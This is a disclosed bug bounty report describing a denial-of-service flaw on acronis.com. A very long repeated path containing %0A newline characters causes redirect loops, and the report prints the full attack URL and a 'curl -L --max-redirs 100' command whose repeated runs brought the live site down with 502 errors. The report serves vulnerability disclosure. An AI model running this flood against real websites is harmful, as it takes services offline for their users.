# %0A (New line) and limitness URL leads to DoS at all system [Main adress (https://www.acronis.com/)]

## Report Details
- **Report ID**: 1382448
- **URL**: https://hackerone.com/reports/1382448
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-10-26T19:51:27.875Z
- **Disclosed**: 2022-01-04T09:47:15.200Z

## Reporter
- **Username**: plantos
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Hello team, hopefully you are happy now

I found a DoS vulnerabilty at https://www.acronis.com/ (Note: site is still down and this is not intentional behavior and i didn't use any automated tool)
At first i saw this code at site: <a href="URL/path">someting</a> and tried XSS but site was filtered " and '. So i tried with new line command (%0a) and the site gave 301 and again and again. Then i think like this: this is be DoS? And tried at just 1 page and no result :( Then i opened a few (10-15) page and execute this curl command: 

curl -L --max-redirs 100 "https://www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0ahttps:/www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0A" and it's worked. I refreshed the page and site gave 502 bad gateway a said yesss and stoped the attack. But site gave 502 about 30 m - 1 hour.

--------------------------------------------------------------------------------------------------------------------------------------

Steps to reproduce:

1) Go to https://www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0ahttps:/www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0A at your browser at 10-15 page

2) Execute this command at kali linux a few times and at a few terminal: curl -L --max-redirs 100 "https://www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0ahttps:/www.acronis.com/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/en-us/%0A"

3) Check the adress (https://www.acronis.com/) and as you can see site will give 502 bad gateway

--------------------------------------------------------------------------------------------------------------------------------------

Check-host report: https://check-host.net/check-report/523034ckf92

Fix: idk why have this problem (%0a - 301) but another reason for this problem is that the site allows very long characters. So you should limit the number of characters in the URL and solve the other problem

Best Regards,
Plantos

## Impact

An attacker can down the acronis services at just 2 mins.

## Attachments
- acronis-dos.png
